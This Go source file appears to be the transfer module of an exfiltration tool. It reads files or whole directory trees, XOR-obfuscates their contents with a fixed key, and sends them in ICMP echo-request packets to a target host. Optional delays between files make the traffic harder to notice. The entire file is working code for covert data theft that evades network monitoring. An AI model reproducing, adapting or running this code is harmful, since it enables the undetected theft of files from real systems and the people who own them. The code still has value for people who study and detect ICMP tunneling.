package transfer

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"time"
	"client/utils"
)

const xorKey = 0xAA // XOR encryption key

// ICMP message structure
type ICMP struct {
	Type     uint8
	Code     uint8
	Checksum uint16
	ID       uint16
	Seq      uint16
	Data     []byte
}

func (icmp *ICMP) Marshal() []byte {
	buf := new(bytes.Buffer)
	binary.Write(buf, binary.BigEndian, icmp.Type)
	binary.Write(buf, binary.BigEndian, icmp.Code)
	binary.Write(buf, binary.BigEndian, icmp.Checksum)
	binary.Write(buf, binary.BigEndian, icmp.ID)
	binary.Write(buf, binary.BigEndian, icmp.Seq)
	buf.Write(icmp.Data)
	icmp.Checksum = checksum(buf.Bytes())
	buf.Reset()
	binary.Write(buf, binary.BigEndian, icmp.Type)
	binary.Write(buf, binary.BigEndian, icmp.Code)
	binary.Write(buf, binary.BigEndian, icmp.Checksum)
	binary.Write(buf, binary.BigEndian, icmp.ID)
	binary.Write(buf, binary.BigEndian, icmp.Seq)
	buf.Write(icmp.Data)
	return buf.Bytes()
}

func checksum(data []byte) uint16 {
	sum := 0
	for i := 0; i < len(data)-1; i += 2 {
		sum += int(data[i])<<8 | int(data[i+1])
	}
	if len(data)%2 == 1 {
		sum += int(data[len(data)-1]) << 8
	}
	for (sum >> 16) > 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return uint16(^sum)
}

func xorEncryptDecrypt(data []byte) []byte {
	result := make([]byte, len(data))
	for i := range data {
		result[i] = data[i] ^ xorKey
	}
	return result
}

// SendICMPFile sends a file over ICMP packets
func SendICMPFile(target, filePath string) error {
	conn, err := net.Dial("ip4:icmp", target)
	if err != nil {
		return fmt.Errorf("\n[-] Failed to connect to target %s: %v", target, err)
	}
	defer conn.Close()

	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("\n[-] Failed to open file %s: %v", filePath, err)
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil {
		return fmt.Errorf("\n[-] Failed to get file info: %v", err)
	}

	buffer := make([]byte, 1024)
	seq := uint16(1)
	fileName := filepath.Base(filePath)

	fmt.Printf("[*] Sending file: %s to target: %s\n", fileName, target)

	// Send filename packet
	filenamePacket := &ICMP{
		Type: 8, // Echo Request
		Code: 0,
		ID:   1234,
		Seq:  seq,
		Data: xorEncryptDecrypt([]byte(fmt.Sprintf("%s|", fileName))),
	}
	conn.Write(filenamePacket.Marshal())
	seq++
	time.Sleep(100 * time.Millisecond)

	// Progress tracker
	progress := make(chan int, 1)
	go func() {
		for p := range progress {
			percentage := float64(p) / float64(fileInfo.Size()) * 100
			fmt.Printf("[*] Uploading %s: %.2f%% complete\n", fileName, percentage)
		}
	}()

	totalBytesSent := 0
	for {
		n, err := file.Read(buffer)
		if err == io.EOF {
			break
		}
		if err != nil {
			return fmt.Errorf("\n[-] Failed to read file: %v", err)
		}

		encryptedData := xorEncryptDecrypt(buffer[:n])
		icmp := &ICMP{
			Type: 8, // Echo Request
			Code: 0,
			ID:   1234,
			Seq:  seq,
			Data: encryptedData,
		}
		seq++

		_, err = conn.Write(icmp.Marshal())
		if err != nil {
			return fmt.Errorf("\n[-] Failed to send packet: %v", err)
		}

		totalBytesSent += n
		progress <- totalBytesSent
		time.Sleep(100 * time.Millisecond)
	}

	// Send EOF packet to signal end of file
	eofPacket := &ICMP{
		Type: 8, // Echo Request
		Code: 0,
		ID:   1234,
		Seq:  seq,
		Data: xorEncryptDecrypt([]byte("EOF")),
	}
	conn.Write(eofPacket.Marshal())

	close(progress)
	return nil
}

// UploadICMP uploads files over ICMP with optional scheduling
func UploadICMP(target, path string, includePatterns []string, scheduleInterval int) error {
	info, err := os.Stat(path)
	if err != nil {
		return fmt.Errorf("\n[-] Failed to access path: %v", err)
	}

	// Use WalkAndUpload for recursive directory traversal & scheduling
	if info.IsDir() {
		return utils.WalkAndUpload(path, "", includePatterns, func(localPath, remotePath string) error {
			err := SendICMPFile(target, localPath)
			if err != nil {
				return fmt.Errorf("\n[-] Error sending file: %s", err)
			}

			// If scheduling is enabled, wait before the next upload
			if scheduleInterval > 0 {
				fmt.Printf("[*] Waiting %d minutes before uploading next file...\n", scheduleInterval)
				time.Sleep(time.Duration(scheduleInterval) * time.Minute)
			}

			return nil
		}, scheduleInterval)
	}

	// Single file upload
	err = SendICMPFile(target, path)
	if err != nil {
		return fmt.Errorf("\n[-] Error sending file: %s", err)
	}

	return nil
}
